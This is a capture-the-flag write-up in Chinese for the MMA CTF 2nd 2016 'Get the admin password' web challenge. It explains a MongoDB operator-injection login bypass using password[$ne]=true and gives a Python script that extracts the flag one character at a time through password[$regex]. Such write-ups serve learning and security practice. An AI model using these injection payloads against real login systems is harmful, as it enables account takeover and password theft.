title: '[MMA CTF 2nd 2016] Get the admin password 100'
author: bananaapple
tags:
  - web
  - sql injection
  - MMA CTF 2nd 2016
categories:
  - write-ups
date: 2016-09-06 00:45:00
---

# 漏洞解析

感謝隊友 Ann Tsai 試出來漏洞

我這裡負責剪尾刀把 script 寫完

大概試了一下可以發現漏洞是 sql injection 

只是由於 database 是 nosql 稍微有點不一樣

相關內容可以參考以下的這篇文章

https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/

POST http://gap.chal.ctf.westerns.tokyo/login.php

user=admin&password[$ne]=true&submit=true

就能夠成功登入

`$ne` 是 `not equal` operator

所以說要是資料庫裡的 password not equal 輸入的 password

就能夠成功登入

接下來的 payload 就會利用控制 operator 的方式爆出密碼

# payload

mongoDB 可以使用的 operator 可以參考以下連結

https://docs.mongodb.com/manual/reference/operator/query/

在這裡我使用的 `regex` operator

想法是 `regex` 的 pattern 使用 `^TWCTF{` 

代表 `TMCTF{` 開頭的字串

然後一個一個字元加 把 flag 爆出來

注意一下跳脫字元即可

payload 如下

```python3
#!/usr/bin/env python3
import requests
import string
import re
url = 'http://gap.chal.ctf.westerns.tokyo/login.php'
flag = '^TWCTF{'
print(string.printable)
while True:
    for c in string.printable:
        qq = flag+re.escape(c)
        print(qq)
        payload = {'user': 'admin', 'password[$regex]': qq,'submit': True}
        r = requests.post(url,payload)
        if 'TWCTF{...}' in r.text:
            flag+=c
            print(flag)
            break
```

# flag

```
TWCTF{wasshoi!summer_festival!}
```